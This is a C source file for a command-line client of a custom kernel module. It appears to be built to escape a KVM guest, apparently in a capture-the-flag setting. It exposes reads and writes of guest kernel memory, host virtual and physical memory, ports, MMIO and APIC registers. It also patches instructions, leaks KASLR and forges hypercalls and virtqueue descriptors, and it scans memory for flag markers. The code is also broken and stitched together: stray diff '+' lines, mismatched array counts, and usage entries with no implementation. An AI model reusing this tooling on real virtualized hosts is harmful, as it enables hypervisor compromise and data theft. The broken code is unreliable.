#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <inttypes.h>
#include <time.h>
#include <linux/virtio_ids.h>
#include <sys/mman.h>
#include <ctype.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_ATTACH_VQ          0x1013
#define IOCTL_TRIGGER_VQ         0x1014
#define IOCTL_SCAN_PHYS          0x1015
// NEW: Host memory access IOCTLs
#define IOCTL_READ_HOST_MEM      0x1016
#define IOCTL_WRITE_HOST_MEM     0x1017
#define IOCTL_READ_HOST_PHYS     0x1018
#define IOCTL_WRITE_HOST_PHYS    0x1019

/* New guest-side IOCTLs added to kernel module */
#define IOCTL_PROBE_FLAGS_READ   0x1020
#define IOCTL_PROBE_FLAGS_WRITE  0x1021
#define IOCTL_TRIGGER_APIC_WRITE 0x1022
#define IOCTL_TRIGGER_MMIO_WRITE 0x1023
#define IOCTL_TRIGGER_IOPORT_WRITE 0x1024

struct apic_write_req {
    unsigned long base;   /* 0 means use default 0xfee00000 */
    unsigned int offset;  /* offset from APIC base */
    unsigned int size;    /* 1,2,4,8 */
    unsigned long value;
};

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vq_desc_user_data {
    unsigned short index;
    unsigned long long phys_addr;
    unsigned int len;
    unsigned short flags;
    unsigned short next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct attach_vq_data {
    unsigned int device_id;
    unsigned long vq_pfn;
    unsigned int queue_index;
};

// NEW: Host memory access structures
struct host_mem_access {
    unsigned long host_addr;     // Host virtual address
    unsigned long length;
    unsigned char *user_buffer;
};

// NEW: Host physical memory access
struct host_phys_access {
    unsigned long host_phys_addr; // Host physical address
    unsigned long length;
    unsigned char *user_buffer;
};

// Gold pattern constants
#define GOLD_FLAG_STRINGS_COUNT 2
static const char *GOLD_ASCII_STRINGS[GOLD_FLAG_STRINGS_COUNT] = {
    "44434241efbeadde",
    "44342414deadbeef",
    "deadbeef14243444",
    "deadbeef41424344",
    "write_flag",
    "rce_flag",
    "read_flag"
};

#define GOLD_HEX_STRINGS_COUNT 4
static const char *GOLD_HEX_STRINGS[GOLD_HEX_STRINGS_COUNT] = {
    "44434241efbeadde",
    "44342414deadbeef",
    "deadbeef14243444",
    "deadbeef41424344",
    "write_flag",
    "rce_flag",
    "read_flag"
};

void print_usage(char *prog_name) {
    fprintf(stderr, "  Usage: %s <command> [args...]\n", prog_name);
    fprintf(stderr, "  Commands:\n");
    fprintf(stderr, "  readport <port_hex> <size_bytes (1,2,4)>\n");
    fprintf(stderr, "  writeport <port_hex> <value_hex> <size_bytes (1,2,4)>\n");
    fprintf(stderr, "  readmmio_val <phys_addr_hex> <size_bytes (1,2,4,8)>\n");
    fprintf(stderr, "  writemmio_val <phys_addr_hex> <value_hex> <size_bytes (1,2,4,8)>\n");
    fprintf(stderr, "  readmmio_buf <phys_addr_hex> <num_bytes_to_read>\n");
    fprintf(stderr, "  writemmio_buf <phys_addr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  readkvmem <kaddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writekvmem <kaddr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  readhostmem <host_vaddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writehostmem <host_vaddr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  readhostphys <host_paddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writehostphys <host_paddr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  allocvqpage\n");
    fprintf(stderr, "  freevqpage\n");
    fprintf(stderr, "  writevqdesc <idx> <buf_gpa_hex> <buf_len> <flags_hex> <next_idx>\n");
    fprintf(stderr, "  trigger_hypercall\n");
    fprintf(stderr, "  hypercall <nr> [arg0] [arg1] [arg2] [arg3]\n");
    fprintf(stderr, "  exploit_delay <nanoseconds>\n");
    fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\n");
    fprintf(stderr, "  scanva <va_hex> <num_bytes>\n");
    fprintf(stderr, "  scanva_range <start> <end> <step>\n");
    fprintf(stderr, "  writeva <va_hex> <hex_string>\n");
    fprintf(stderr, "  patchinstr <va_hex> <hex_string>\n");
    fprintf(stderr, "  readflag\n");
    fprintf(stderr, "  writeflag <value_hex>\n");
    fprintf(stderr, "  probe_flags_read\n");
    fprintf(stderr, "  probe_flags_write <value_hex>\n");
    fprintf(stderr, "  trigger_apic_write <offset-hex> <size(1|2|4|8)> <value-hex> [base-hex]\n");
    fprintf(stderr, "  trigger_mmio_write <phys-hex> <map-size-or-0> <value-size(1|2|4|8)> <value-hex>\n");
    fprintf(stderr, "  trigger_ioport_write <port-hex> <size(1|2|4)> <value-hex>\n");
    fprintf(stderr, "  getkaslr\n");
    fprintf(stderr, "  virt2phys <virt_addr_hex>\n");
    fprintf(stderr, "  attachvq <device_id> <vq_pfn> <queue_index>\n");
    fprintf(stderr, "  trigvq <device_id>\n");
    fprintf(stderr, "  scanphys <start_addr_hex> <end_addr_hex> <step_bytes>\n");
    fprintf(stderr, "  scanhostmem <start_host_vaddr_hex> <end_host_vaddr_hex> <step_bytes> [--gold]\n");
    fprintf(stderr, "  scanhostphys <start_host_paddr_hex> <end_host_paddr_hex> <step_bytes> [--gold]\n");
    fprintf(stderr, "  --gold flag: Can be placed anywhere on the command line. When present\n");
    fprintf(stderr, "               only output commands that contain gold patterns (reduces noise).\n");
}

unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
    size_t len = strlen(hex_str);
    if (len % 2 != 0) {
        fprintf(stderr, "Hex string must have even number of characters.\n");
        return NULL;
    }
    *num_bytes = len / 2;
    unsigned char *bytes = (unsigned char *)malloc(*num_bytes);
    if (!bytes) {
        perror("malloc for hex_string_to_bytes");
        return NULL;
    }
    for (size_t i = 0; i < *num_bytes; ++i) {
        if (sscanf(hex_str + 2 * i, "%2hhx", &bytes[i]) != 1) {
            fprintf(stderr, "Invalid hex char in string.\n");
            free(bytes);
            return NULL;
        }
    }
    return bytes;
}

void exploit_delay(int nanoseconds) {
    struct timespec req = {0};
    req.tv_nsec = nanoseconds;
    nanosleep(&req, NULL);
}

// Helper function to check for gold patterns
int check_gold_patterns(const unsigned char *data, unsigned long length, unsigned long base_addr) {
    int found = 0;
    
    // Check ASCII patterns
    for (int i = 0; i < GOLD_FLAG_STRINGS_COUNT; i++) {
        const char *pattern = GOLD_ASCII_STRINGS[i];
        size_t pattern_len = strlen(pattern);
        
        for (unsigned long j = 0; j <= length - pattern_len; j++) {
            if (memcmp(data + j, pattern, pattern_len) == 0) {
                printf("[GOLD] Found ASCII pattern '%s' at offset 0x%lx (addr 0x%lx)\n", 
                       pattern, j, base_addr + j);
                found = 1;
                
                // Print hex and ASCII context
                printf("Hex context: ");
                unsigned long start = (j >= 16) ? j - 16 : 0;
                unsigned long end = (j + pattern_len + 16 < length) ? j + pattern_len + 16 : length;
                for (unsigned long k = start; k < end; k++) {
                    printf("%02X", data[k]);
                }
                printf("\nASCII context: ");
                for (unsigned long k = start; k < end; k++) {
                    unsigned char c = data[k];
                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
                }
                printf("\n\n");
            }
        }
    }
    
    // Check hex patterns (convert hex string to bytes and search)
    for (int i = 0; i < GOLD_HEX_STRINGS_COUNT; i++) {
        const char *hex_pattern = GOLD_HEX_STRINGS[i];
        size_t hex_len = strlen(hex_pattern);
        if (hex_len % 2 != 0) continue;
        
        size_t byte_len = hex_len / 2;
        unsigned char *pattern_bytes = malloc(byte_len);
        if (!pattern_bytes) continue;
        
        // Convert hex string to bytes
        for (size_t p = 0; p < byte_len; p++) {
            sscanf(hex_pattern + 2*p, "%2hhx", &pattern_bytes[p]);
        }
        
        // Search for the byte pattern
        for (unsigned long j = 0; j <= length - byte_len; j++) {
            if (memcmp(data + j, pattern_bytes, byte_len) == 0) {
                printf("[GOLD] Found HEX pattern '%s' at offset 0x%lx (addr 0x%lx)\n", 
                       hex_pattern, j, base_addr + j);
                found = 1;
                
                // Print hex and ASCII context
                printf("Hex context: ");
                unsigned long start = (j >= 16) ? j - 16 : 0;
                unsigned long end = (j + byte_len + 16 < length) ? j + byte_len + 16 : length;
                for (unsigned long k = start; k < end; k++) {
                    printf("%02X", data[k]);
                }
                printf("\nASCII context: ");
                for (unsigned long k = start; k < end; k++) {
                    unsigned char c = data[k];
                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
                }
                printf("\n\n");
            }
        }
        
        free(pattern_bytes);
    }
    
    return found;
}

/* Print a u64 value as a full 64-hex-digit string (zero-padded on the left).
 * Note: the kernel IOCTL currently returns an unsigned long (64 bits). To
 * return a true 256-bit / 64-hex-digit flag the kernel IOCTL must be changed
 * to return the full byte array (e.g. 32 bytes). This helper guarantees
 * untruncated 64-hex-digit formatting for the 64-bit value we receive.
 */
static void print_full_64hex_from_u64(unsigned long v)
{
    char s[65];
    memset(s, '0', 64);
    s[64] = '\0';
    /* write the lower 16 hex digits (64-bit value) into the right-most part */
    snprintf(s + 48, 17, "%016llx", (unsigned long long)v);
    printf("0x%s", s);
}

/* Global: enable "gold" filtering for any command when present anywhere on argv */
static int g_global_gold = 0;

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    /* Scan argv for a global --gold flag and remove it so command parsing is unchanged */
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--gold") == 0) {
            g_global_gold = 1;
            /* remove argv[i] by shifting left */
            for (int j = i; j < argc - 1; ++j)
                argv[j] = argv[j+1];
            argc--;
            i--; /* re-check the new argv[i] */
        }
    }
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open " DEVICE_PATH ". Is the kernel module loaded?");
        return 1;
    }
    char *cmd = argv[1];

    if (strcmp(cmd, "readport") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data data;
        data.port = (unsigned short)strtoul(argv[2], NULL, 16);
        data.size = (unsigned int)strtoul(argv[3], NULL, 10);
        if (ioctl(fd, IOCTL_READ_PORT, &data) < 0)
            perror("ioctl READ_PORT failed");
        else
            printf("Port 0x%X (size %u) Value: 0x%X (%u)\n", data.port, data.size, data.value, data.value);

    } else if (strcmp(cmd, "writeport") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data data;
        data.port = (unsigned short)strtoul(argv[2], NULL, 16);
        data.value = (unsigned int)strtoul(argv[3], NULL, 16);
        data.size = (unsigned int)strtoul(argv[4], NULL, 10);
        if (ioctl(fd, IOCTL_WRITE_PORT, &data) < 0)
            perror("ioctl WRITE_PORT failed");
        else
            printf("Wrote 0x%X to port 0x%X (size %u)\n", data.value, data.port, data.size);

    } else if (strcmp(cmd, "readmmio_val") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.value_size = (unsigned int)strtoul(argv[3], NULL, 10);
        data.size = 0;
        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
            perror("ioctl READ_MMIO (value) failed");
        else
            printf("MMIO 0x%lX (size %u) Value: 0x%lX (%lu)\n", data.phys_addr, data.value_size, data.single_value, data.single_value);

    } else if (strcmp(cmd, "writemmio_val") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.single_value = strtoul(argv[3], NULL, 16);
        data.value_size = (unsigned int)strtoul(argv[4], NULL, 10);
        data.size = 0;
        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
            perror("ioctl WRITE_MMIO (value) failed");
        else
            printf("Wrote 0x%lX to MMIO 0x%lX (size %u)\n", data.single_value, data.phys_addr, data.value_size);

    } else if (strcmp(cmd, "readmmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.size = strtoul(argv[3], NULL, 10);
        if (data.size == 0 || data.size > 65536) {
            fprintf(stderr, "Invalid read size for buffer (max 64K).\n");
            close(fd);
            return 1;
        }
        data.user_buffer = (unsigned char*)malloc(data.size);
        if (!data.user_buffer) {
            perror("malloc for read buffer");
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
            perror("ioctl READ_MMIO (buffer) failed");
        else {
            if (g_global_gold) {
                int found = check_gold_patterns(data.user_buffer, data.size, data.phys_addr);
                if (!found) {
                    /* suppressed output when nothing gold was found */
                }
            } else {
                printf("Read %lu bytes from MMIO 0x%lX:\n", data.size, data.phys_addr);
                for (unsigned long i = 0; i < data.size; ++i) {
                    printf("%02X", data.user_buffer[i]);
                    if ((i+1) % 16 == 0) printf(" ");
                }
                printf("\n\n[ASCII]:\n");
                for (unsigned long i = 0; i < data.size; ++i) {
                    unsigned char c = data.user_buffer[i];
                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    if ((i+1) % 16 == 0) printf(" ");
                }
                printf("\n");
            }
         }
         free(data.user_buffer);

    } else if (strcmp(cmd, "writemmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        unsigned char *bytes_to_write = hex_string_to_bytes(argv[3], &num_bytes);
        if (!bytes_to_write || num_bytes == 0) {
            fprintf(stderr, "Failed to parse hex string or zero length.\n");
            if (bytes_to_write) free(bytes_to_write);
            close(fd);
            return 1;
        }
        data.user_buffer = bytes_to_write;
        data.size = num_bytes;
        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
            perror("ioctl WRITE_MMIO (buffer) failed");
        else
            printf("Wrote %lu bytes to MMIO 0x%lX from hex string.\n", data.size, data.phys_addr);
        free(bytes_to_write);

+    } else if (strcmp(cmd, "probe_flags_read") == 0) {
+        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long val = 0;
+        if (ioctl(fd, IOCTL_PROBE_FLAGS_READ, &val) < 0) {
+            perror("ioctl PROBE_FLAGS_READ failed");
+        } else {
+            printf("Probe flags read: ");
+            print_full_64hex_from_u64(val);
+            printf("\n");
+        }
+
+    } else if (strcmp(cmd, "probe_flags_write") == 0) {
+        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long val = strtoul(argv[2], NULL, 16);
+        if (ioctl(fd, IOCTL_PROBE_FLAGS_WRITE, &val) < 0) {
+            perror("ioctl PROBE_FLAGS_WRITE failed");
+        } else {
+            printf("Wrote ");
+            print_full_64hex_from_u64(val);
+            printf(" to first host flag symbol (probe)\n");
+        }
+
+    } else if (strcmp(cmd, "trigger_apic_write") == 0) {
+        if (argc < 5) { print_usage(argv[0]); close(fd); return 1; }
+        struct apic_write_req req;
+        req.base = 0;
+        req.offset = (unsigned int)strtoul(argv[2], NULL, 16);
+        req.size = (unsigned int)strtoul(argv[3], NULL, 10);
+        req.value = strtoul(argv[4], NULL, 16);
+        if (argc >= 6) req.base = strtoul(argv[5], NULL, 16);
+        if (req.size != 1 && req.size != 2 && req.size != 4 && req.size != 8) {
+            fprintf(stderr, "Invalid size for APIC write\n"); close(fd); return 1;
+        }
+        if (ioctl(fd, IOCTL_TRIGGER_APIC_WRITE, &req) < 0) {
+            perror("ioctl TRIGGER_APIC_WRITE failed");
+        } else {
+            printf("APIC write issued base=0x%lx off=0x%x size=%u val=0x%lx\n",
+                   req.base, req.offset, req.size, req.value);
+        }
+
+    } else if (strcmp(cmd, "trigger_mmio_write") == 0) {
+        if (argc != 6) { print_usage(argv[0]); close(fd); return 1; }
+        struct mmio_data data = {0};
+        data.phys_addr = strtoul(argv[2], NULL, 16);
+        data.size = strtoul(argv[3], NULL, 10); /* 0 for single-value */
+        data.value_size = (unsigned int)strtoul(argv[4], NULL, 10);
+        data.single_value = strtoul(argv[5], NULL, 16);
+        if (data.value_size != 1 && data.value_size != 2 && data.value_size != 4 && data.value_size != 8) {
+            fprintf(stderr, "Invalid value-size\n"); close(fd); return 1;
+        }
+        if (ioctl(fd, IOCTL_TRIGGER_MMIO_WRITE, &data) < 0) {
+            perror("ioctl TRIGGER_MMIO_WRITE failed");
+        } else {
+            printf("MMIO write issued phys=0x%lx map_size=%lu value_size=%u val=0x%lx\n",
+                   data.phys_addr, data.size, data.value_size, data.single_value);
+        }
+
+    } else if (strcmp(cmd, "trigger_ioport_write") == 0) {
+        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
+        struct port_io_data p = {0};
+        p.port = (unsigned short)strtoul(argv[2], NULL, 16);
+        p.size = (unsigned int)strtoul(argv[3], NULL, 10);
+        p.value = (unsigned int)strtoul(argv[4], NULL, 16);
+        if (p.size != 1 && p.size != 2 && p.size != 4) {
+            fprintf(stderr, "Invalid port write size\n"); close(fd); return 1;
+        }
+        if (ioctl(fd, IOCTL_TRIGGER_IOPORT_WRITE, &p) < 0) {
+            perror("ioctl TRIGGER_IOPORT_WRITE failed");
+        } else {
+            printf("IO port write issued port=0x%X size=%u val=0x%X\n", p.port, p.size, p.value);
+        }
+
    } else if (strcmp(cmd, "getkaslr") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long slide;
        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0) {
            perror("ioctl GET_KASLR_SLIDE failed");
        } else {
            printf("KASLR slide: 0x%lx\n", slide);
        }

    } else if (strcmp(cmd, "virt2phys") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long virt = strtoul(argv[2], NULL, 16);
        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &virt) < 0) {
            perror("ioctl VIRT_TO_PHYS failed");
        } else {
            printf("Virtual 0x%lx -> Physical 0x%lx\n",
                   strtoul(argv[2], NULL, 16), virt);
        }

    } else if (strcmp(cmd, "attachvq") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct attach_vq_data data = {
            .device_id = (unsigned int)strtoul(argv[2], NULL, 10),
            .vq_pfn = strtoul(argv[3], NULL, 16),
            .queue_index = (unsigned int)strtoul(argv[4], NULL, 10)
        };
        if (ioctl(fd, IOCTL_ATTACH_VQ, &data) < 0)
            perror("ioctl ATTACH_VQ failed");
        else
            printf("Virtqueue attached to device %u\n", data.device_id);

    } else if (strcmp(cmd, "trigvq") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned int device_id = (unsigned int)strtoul(argv[2], NULL, 10);
        if (ioctl(fd, IOCTL_TRIGGER_VQ, &device_id) < 0)
            perror("ioctl TRIGGER_VQ failed");
        else
            printf("Triggered device %u processing\n", device_id);

    } else if (strcmp(cmd, "scanphys") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long start = strtoul(argv[2], NULL, 16);
        unsigned long end = strtoul(argv[3], NULL, 16);
        unsigned long step = strtoul(argv[4], NULL, 10);
        if (step == 0 || step > 99999999) {
            fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
            close(fd);
            return 1;
        }
        unsigned char *buf = malloc(step);
        if (!buf) {
            perror("malloc for scanphys buffer");
            close(fd);
            return 1;
        }
        for (unsigned long addr = start; addr < end; addr += step) {
            struct mmio_data data = {0};
            data.phys_addr = addr;
            data.size = step;
            data.user_buffer = buf;
            if (ioctl(fd, IOCTL_SCAN_PHYS, &data) < 0) {
                printf("0x%lX: ERROR\n", addr);
            } else {
                printf("0x%lX:", addr);
                for (unsigned long i = 0; i < step; ++i) {
                    printf("%02X", buf[i]);
                }
                printf("\n");
            }
        }
        free(buf);

    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        print_usage(argv[0]);
    }
    close(fd);
    return 0;
}